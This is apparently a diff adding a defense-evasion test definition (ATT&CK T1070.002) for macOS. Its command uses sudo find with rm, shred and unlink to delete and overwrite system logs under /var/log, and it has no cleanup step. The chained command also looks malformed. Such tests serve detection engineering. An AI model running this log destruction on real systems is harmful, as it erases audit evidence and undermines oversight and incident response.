@@ -1,0 +1,18 @@
+- description: 'This test finds and deletes the system log files within /var/log/
+    directory using various executions(rm, shred, unlink)
+
+    '
+  id: 553350f9-a565-47d9-958e-84ffecdcacc9
+  name: System log file deletion via find utility
+  platforms:
+    darwin:
+      sh:
+        cleanup: ''
+        command: sudo find /var/log -name 'system.log*' -exec rm {} \; sudo find /var/log
+          -name "system.log.97.gz*" -exec shred -u -z -n 3 {} \; sudo find /var/log
+          -name "system.log.98.gz*" -exec unlink {} \
+        payloads: []
+  tactic: defense-evasion
+  technique:
+    attack_id: T1070.002
+    name: 'Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs'
